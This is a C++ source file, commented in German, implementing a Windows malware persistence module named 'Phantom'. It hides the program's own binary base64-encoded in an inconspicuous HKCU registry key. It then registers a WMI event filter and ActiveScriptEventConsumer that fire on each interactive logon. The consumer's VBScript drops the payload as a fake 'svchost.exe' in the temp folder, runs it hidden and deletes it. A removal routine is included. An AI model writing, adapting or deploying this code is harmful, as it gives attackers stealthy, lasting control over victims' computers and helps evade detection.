#include "persistence.h"
#include <Wbemidl.h>
#include <comdef.h>
#include <wbemidl.h>
#include <vector>
#include <string>
#include <iostream>
#include <atlbase.h>

#pragma comment(lib, "wbemuuid.lib")

// --- Konstanten-Definitionen ---
const wchar_t* Persistence::FILTER_NAME = L"PhantomFilter";
const wchar_t* Persistence::CONSUMER_NAME = L"PhantomConsumer";

// Binde den Filter an den Consumer
const wchar_t* Persistence::BINDING_NAME = L"__FilterToConsumerBinding.EventConsumer=\"ActiveScriptEventConsumer.Name=\\\"PhantomConsumer\\\"\",Filter=\"__EventFilter.Name=\\\"PhantomFilter\\\"\"";

// Unauffälliger Pfad in HKCU
const wchar_t* Persistence::REG_SUBKEY = L"Software\\Classes\\Mapi.Mail.Attach"; 
const wchar_t* Persistence::REG_VALUE_NAME = L"Content";

// KORREKTUR: Vollständige Base64-Implementierung
static const std::string base64_chars = 
             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
             "abcdefghijklmnopqrstuvwxyz"
             "0123456789+/";

std::string base64_encode(const std::vector<unsigned char>& in) {
    std::string ret;
    int i = 0;
    int j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];
    size_t in_len = in.size();

    while (in_len--) {
        char_array_3[i++] = in[j++];
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for(i = 0; (i <4) ; i++)
                ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }
    if (i) {
        for(int j = i; j < 3; j++) char_array_3[j] = '\0';
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        for(int j = 0; (j < i + 1); j++) ret += base64_chars[char_array_4[j]];
        while((i++ < 3)) ret += '=';
    }
    return ret;
}

// --- Implementierungen ---

HRESULT Persistence::Enable() {
    HRESULT hr;

    // 1. COM initialisieren
    hr = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hr)) return hr;

    hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    if (FAILED(hr)) {
        CoUninitialize();
        return hr;
    }

    // 2. Payload lesen und in Registry schreiben
    char ownPath[MAX_PATH];
    GetModuleFileNameA(NULL, ownPath, MAX_PATH);
    HANDLE hFile = CreateFileA(ownPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { CoUninitialize(); return E_FAIL; }
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    std::vector<unsigned char> payload(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, payload.data(), fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    std::string encodedPayload = base64_encode(payload);

    HKEY hKey;
    RegCreateKeyExW(HKEY_CURRENT_USER, REG_SUBKEY, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    RegSetValueExW(hKey, REG_VALUE_NAME, 0, REG_SZ, (const BYTE*)encodedPayload.c_str(), encodedPayload.size() + 1);
    RegCloseKey(hKey);

    // 3. WMI Verbindung
    IWbemLocator* pLoc = NULL;
    hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hr)) { CoUninitialize(); return hr; }

    IWbemServices* pSvc = NULL;
    hr = pLoc->ConnectServer(_bstr_t(L"ROOT\\SUBSCRIPTION"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
    if (FAILED(hr)) { pLoc->Release(); CoUninitialize(); return hr; }

    // 4. Event Filter erstellen
    IWbemClassObject* pFilterClass = NULL;
    pSvc->GetObject(_bstr_t(L"__EventFilter"), 0, NULL, &pFilterClass, NULL);
    
    IWbemClassObject* pFilterInst = NULL;
    pFilterClass->SpawnInstance(0, &pFilterInst);

    VARIANT v;
    V_BSTR(&v) = SysAllocString(FILTER_NAME);
    V_VT(&v) = VT_BSTR;
    pFilterInst->Put(L"Name", 0, &v, 0);
    VariantClear(&v);

    V_BSTR(&v) = SysAllocString(L"WQL");
    V_VT(&v) = VT_BSTR;
    pFilterInst->Put(L"QueryLanguage", 0, &v, 0);
    VariantClear(&v);

    V_BSTR(&v) = SysAllocString(L"SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType=2");
    V_VT(&v) = VT_BSTR;
    pFilterInst->Put(L"Query", 0, &v, 0);
    VariantClear(&v);

    pSvc->PutInstance(pFilterInst, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    pFilterInst->Release();
    pFilterClass->Release();

    // 5. ActiveScriptEventConsumer erstellen
    IWbemClassObject* pConsumerClass = NULL;
    pSvc->GetObject(_bstr_t(L"ActiveScriptEventConsumer"), 0, NULL, &pConsumerClass, NULL);

    IWbemClassObject* pConsumerInst = NULL;
    pConsumerClass->SpawnInstance(0, &pConsumerInst);

    VARIANT vConsumer;
    V_BSTR(&vConsumer) = SysAllocString(CONSUMER_NAME);
    V_VT(&vConsumer) = VT_BSTR;
    pConsumerInst->Put(L"Name", 0, &vConsumer, 0);
    VariantClear(&vConsumer);
    
    V_BSTR(&vConsumer) = SysAllocString(L"VBScript");
    V_VT(&vConsumer) = VT_BSTR;
    pConsumerInst->Put(L"ScriptingEngine", 0, &vConsumer, 0);
    VariantClear(&vConsumer);
    
    // Das VBScript, das den Payload aus der Registry liest und ausführt
    std::wstring vbscript = L"Set objShell = CreateObject(\"WScript.Shell\")\n"
                          L"Set objFSO = CreateObject(\"Scripting.FileSystemObject\")\n"
                          L"tempFolder = objFSO.GetSpecialFolder(2)\n"
                          L"tempFile = tempFolder & \"\\svchost.exe\"\n"
                          L"b64 = objShell.RegRead(\"HKCU\\" + std::wstring(REG_SUBKEY) + L"\\@" + std::wstring(REG_VALUE_NAME) + L"\")\n"
                          L"decoded = DecodeBase64(b64)\n"
                          L"Set stream = CreateObject(\"ADODB.Stream\")\n"
                          L"stream.Type = 1\n"
                          L"stream.Open\n"
                          L"stream.Write decoded\n"
                          L"stream.SaveToFile tempFile, 2\n"
                          L"stream.Close\n"
                          L"objShell.Run tempFile, 0, false\n"
                          L"WScript.Sleep 5000\n"
                          L"objFSO.DeleteFile tempFile\n"
                          L"Function DecodeBase64(ByVal base64)\n"
                          L"    Dim DM, EL\n"
                          L"    Set DM = CreateObject(\"Microsoft.XMLDOM\")\n"
                          L"    Set EL = DM.createElement(\"tmp\")\n"
                          L"    EL.DataType = \"bin.base64\"\n"
                          L"    EL.Text = base64\n"
                          L"    DecodeBase64 = EL.NodeTypedValue\n"
                          L"End Function";
    
    V_BSTR(&vConsumer) = SysAllocString(vbscript.c_str());
    V_VT(&vConsumer) = VT_BSTR;
    pConsumerInst->Put(L"ScriptText", 0, &vConsumer, 0);
    VariantClear(&vConsumer);

    pSvc->PutInstance(pConsumerInst, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    pConsumerInst->Release();
    pConsumerClass->Release();

    // 6. FilterToConsumerBinding erstellen
    IWbemClassObject* pBindingClass = NULL;
    pSvc->GetObject(_bstr_t(L"__FilterToConsumerBinding"), 0, NULL, &pBindingClass, NULL);
    
    IWbemClassObject* pBindingInst = NULL;
    pBindingClass->SpawnInstance(0, &pBindingInst);
    
    VARIANT vBinding;
    V_BSTR(&vBinding) = SysAllocString(CONSUMER_NAME);
    pBindingInst->Put(L"Consumer", 0, &vBinding, 0);
    VariantClear(&vBinding);

    V_BSTR(&vBinding) = SysAllocString(FILTER_NAME);
    pBindingInst->Put(L"Filter", 0, &vBinding, 0);
    VariantClear(&vBinding);
    
    pSvc->PutInstance(pBindingInst, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    pBindingInst->Release();
    pBindingClass->Release();
    
    // 7. Cleanup
    pSvc->Release();
    pLoc->Release();
    CoUninitialize();

    return S_OK;
}

HRESULT Persistence::Disable() {
    HRESULT hr;

    // 1. COM initialisieren und Sicherheit festlegen
    hr = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hr)) return hr;

    hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    if (FAILED(hr)) { CoUninitialize(); return hr; }

    // 2. WMI-Verbindung herstellen
    IWbemLocator* pLoc = NULL;
    hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hr)) { CoUninitialize(); return hr; }

    IWbemServices* pSvc = NULL;
    hr = pLoc->ConnectServer(_bstr_t(L"ROOT\\SUBSCRIPTION"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
    if (FAILED(hr)) { pLoc->Release(); CoUninitialize(); return hr; }

    // 3. WMI-Objekte entfernen (in umgekehrter Reihenfolge der Erstellung)
    // Binding entfernen
    std::wstring bindingPath = L"__FilterToConsumerBinding.Filter=\"__EventFilter.Name='";
    bindingPath += FILTER_NAME;
    bindingPath += L"'\",Consumer=\"ActiveScriptEventConsumer.Name='";
    bindingPath += CONSUMER_NAME;
    bindingPath += L"'\"";
    pSvc->DeleteInstance(_bstr_t(bindingPath.c_str()), 0, NULL, NULL);

    // Consumer entfernen
    std::wstring consumerPath = L"ActiveScriptEventConsumer.Name='";
    consumerPath += CONSUMER_NAME;
    consumerPath += L"'";
    pSvc->DeleteInstance(_bstr_t(consumerPath.c_str()), 0, NULL, NULL);

    // Filter entfernen
    std::wstring filterPath = L"__EventFilter.Name='";
    filterPath += FILTER_NAME;
    filterPath += L"'";
    pSvc->DeleteInstance(_bstr_t(filterPath.c_str()), 0, NULL, NULL);

    // 4. Registry-Eintrag entfernen
    RegDeleteKeyValueW(HKEY_CURRENT_USER, REG_SUBKEY, REG_VALUE_NAME);

    // 5. Cleanup
    pSvc->Release();
    pLoc->Release();
    CoUninitialize();

    std::wcout << L"Persistence removed successfully." << std::endl;
    return S_OK;
} 